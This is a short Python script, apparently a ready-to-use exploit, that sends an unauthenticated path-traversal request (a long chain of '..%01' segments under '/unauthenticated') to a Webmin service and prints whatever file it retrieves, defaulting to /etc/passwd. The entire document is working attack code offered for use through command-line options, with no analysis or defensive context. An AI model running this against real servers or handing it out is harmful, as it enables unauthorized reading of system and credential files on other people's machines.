#!/usr/bin/python

import requests
from optparse import OptionParser

B = "\033[1;34m"
R = "\033[1;31m"
N = "\033[0;0m"
Y = "\033[1;33m"

parser = OptionParser()

parser.add_option("-r", action="store", dest="hostname", help="Set the hostname or the IP Address")
parser.add_option("-y", action="store", dest="protocol", help="Type here the protocol, HTTP or HTTPs")
parser.add_option("-x", action="store", dest="port", help="Port number of the Webmin Service")
parser.add_option("-z", action="store", dest="file", help="File to download")

options, args = parser.parse_args()

hostname = options.hostname
port = options.port
protocol = options.protocol
file = options.file

if not options.hostname:
	print (R + "\n" + "[-] You should set an host" + N)
	print ("[-] Examples: ")
	print ("[-] $python3 exploit.py " + Y + "-r 172.16.1.1 -x 10000 -y HTTP -z /etc/passwd" + "\n")
	exit()

if not options.protocol:
	protocol = "http"

if not options.port:
	port = "10000"

if not options.file:
	file = "/etc/passwd"

payload = "/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/"



target = requests.get (str(protocol) + "://" + str(hostname) + ":" + str(port) + "/unauthenticated" + str(payload) + str(file) )

print(B + "\n" + "RESULT: " + N)
print("\n" +  target.text)

print(B + "\n" + "STATUS CODE: " + "[" + str(target.status_code) + "]" + "\n" + N)
print("\n" + "If the error is anyone except 200, try to check the file arg  directory, it should be like: /etc/xxx/yyy")

print("\n" + "Thanks for using it")
